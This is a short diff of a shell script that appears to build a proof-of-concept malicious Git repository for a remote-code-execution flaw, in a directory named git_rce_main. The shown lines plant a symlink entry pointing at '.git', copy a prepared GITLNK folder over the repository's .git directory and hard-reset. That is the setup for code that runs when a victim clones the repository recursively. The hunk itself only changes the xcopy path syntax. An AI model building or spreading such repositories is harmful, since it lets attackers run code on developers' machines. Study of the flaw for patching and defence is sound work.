@@ -26,7 +26,7 @@ cd git_rce_main
 git rm gitlnk
 git submodule update --init --recursive
 git update-index --add --cacheinfo 120000 $(echo -n ".git" | git hash-object -w --stdin) gitlnk
-xcopy .\GITLNK .\.git //b //e //v //r //i //g //h //o //c //k //y
+xcopy GITLNK .git //b //e //v //r //i //g //h //o //c //k //y
 git reset --hard $(git rev-parse --abbrev-ref HEAD)
 set +x
 echo All done!
